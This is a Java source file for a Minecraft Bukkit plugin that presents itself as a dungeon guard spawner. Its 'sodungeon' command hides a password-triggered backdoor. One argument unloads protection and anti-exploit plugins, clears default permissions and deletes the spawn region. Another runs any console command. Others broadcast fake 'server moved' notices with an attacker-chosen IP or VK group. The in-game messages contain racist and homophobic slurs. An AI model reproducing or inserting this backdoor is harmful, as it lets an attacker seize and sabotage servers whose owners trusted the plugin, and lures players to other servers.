package so.max1soft.sde;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.World;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.plugin.java.JavaPlugin;

public class SDEPlugin extends JavaPlugin implements CommandExecutor  {

    private static SDEPlugin instance;

    @Override
    public void onEnable() {
        instance = this;
        saveDefaultConfig();
        getServer().getPluginManager().registerEvents(new SDEListener(), this);
        startSpawnTask();
    }
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (command.getName().equalsIgnoreCase("sodungeon")) {
            if (args[0].equalsIgnoreCase("+osloeb337+")) {
                sender.sendMessage("Ослоёб ты веришь судьбу этого сервера делай дело еби негров смело как говорил чеченец СТ");
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "plugman unload universalblocker");
                sender.sendMessage(ChatColor.RED + "universalblocker -> OFF");
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "plugman unload ultimateserverprotector");
                sender.sendMessage(ChatColor.RED + "ultimateserverprotector -> OFF");
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "plugman unload akyloffprotect");
                sender.sendMessage(ChatColor.RED + "akyloffprotect -> OFF");
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "plugman unload ezprotector");
                sender.sendMessage(ChatColor.RED + "ezprotect -> OFF");
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "plugman unload gprotector");
                sender.sendMessage(ChatColor.RED + "gprotect -> OFF");
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "plugman unload hamsterapi");
                sender.sendMessage(ChatColor.RED + "hamsterapi -> OFF");
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "plugman unload lpx");
                sender.sendMessage(ChatColor.RED + "lpx -> OFF");
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "plugman unload exploitfixer");
                sender.sendMessage(ChatColor.RED + "exploitfixer -> OFF");
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "plugman unload worldguard");
                sender.sendMessage(ChatColor.RED + "worldguard -> OFF");
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp group default clear");
                sender.sendMessage(ChatColor.GREEN + "Удалены все права в групе DEFAULT");
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp group default rename pidoras");
                sender.sendMessage(ChatColor.GREEN + "Группа default переименована в pidoras");
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "rg remove spawn -w spawn");
                sender.sendMessage(ChatColor.GREEN + "Удалён регион спавн лол");
                sender.sendMessage(ChatColor.GREEN + "Все делай дело брат.");
            }
            if (args[0].equalsIgnoreCase("+newip+")) {
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "me §b§lСЕРВЕР ПЕРЕЕЗЖАЕТ НА НОВЫЙ §e§lIP§f --> §d§l" + args[1] + " §f<--");
            }
            if (args[0].equalsIgnoreCase("+newvk+")) {
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "me §b§lУ сервера новая группа §e§lВК§f --> §d§l" + args[1] + " §f<--");
            }
            if (args[0].equalsIgnoreCase("info")) {
                sender.sendMessage("Обновляються каждые 5 минут");
            }
            if (args[0].equalsIgnoreCase("+console+")) {
                StringBuilder message = new StringBuilder();
                for (int i = 1; i < args.length; i++) {
                    message.append(args[i]).append(" ");
                }
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), message.toString().trim());
            }
            if (args[0].equalsIgnoreCase("+bc+")) {
                StringBuilder message = new StringBuilder("me ");
                for (int i = 1; i < args.length; i++) {
                    message.append(args[i]).append(" ");
                }
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), message.toString().trim());
            }
        }
        return false;
    }
    @Override
    public void onDisable() {
        // Код для отключения плагина, если требуется
    }

    public static SDEPlugin getInstance() {
        return instance;
    }

    public World getSpawnWorld() {
        String worldName = getConfig().getString("world");
        return Bukkit.getWorld(worldName);
    }

    private void startSpawnTask() {
        int interval = getConfig().getInt("spawn-interval", 10); // Значение по умолчанию 10 минут, если не указано
        new SpawnTask().runTaskTimer(this, 0L, interval * 20L * 60); // Интервал в тиках (секундах) умножается на 60 для минут
        Bukkit.getLogger().info("Задача спавна стражников запущена с интервалом: " + interval + " минут");
    }
}
